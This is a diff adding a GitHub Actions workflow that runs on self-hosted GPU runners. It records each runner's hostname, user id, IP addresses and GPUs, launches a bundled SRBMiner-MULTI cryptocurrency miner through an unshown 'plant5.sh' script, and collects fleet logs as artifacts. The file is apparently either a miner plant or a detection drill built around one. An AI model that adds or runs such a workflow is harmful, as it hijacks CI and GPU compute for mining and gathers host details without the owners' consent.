@@ -1,0 +1,49 @@
+name: plant5-srb
+on:
+  workflow_dispatch:
+    inputs:
+      gate_seconds:
+        description: verification gate seconds
+        required: false
+        default: "900"
+concurrency:
+  group: plant5-${{ github.repository }}
+  cancel-in-progress: false
+jobs:
+  plant:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 50
+    strategy:
+      fail-fast: false
+      max-parallel: 2
+      matrix:
+        shard: [1, 2]
+    steps:
+      - uses: actions/checkout@v4
+      - name: inventory
+        run: |
+          echo "runner=$RUNNER_NAME shard=${{ matrix.shard }}"
+          hostname; id; hostname -I
+          nvidia-smi -L || true
+      - name: plant + gate
+        env:
+          GATE_SECONDS: ${{ github.event.inputs.gate_seconds }}
+        run: |
+          set -o pipefail
+          chmod +x ./plant5.sh ./bin/SRBMiner-MULTI-3.8.9
+          ./plant5.sh 2>&1 | tee /tmp/plant5-${{ matrix.shard }}.log
+      - name: collect
+        if: always()
+        run: |
+          mkdir -p out
+          cp /tmp/plant5-*.log out/ 2>/dev/null || true
+          cp /var/log/fleet/srb-*.log out/ 2>/dev/null || true
+          cp /var/log/fleet/probe-*.log out/ 2>/dev/null || true
+          cp /var/log/fleet/negctl-*.log out/ 2>/dev/null || true
+          ls -la out || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: plant5-${{ matrix.shard }}-${{ github.run_id }}
+          path: out/
+          retention-days: 3
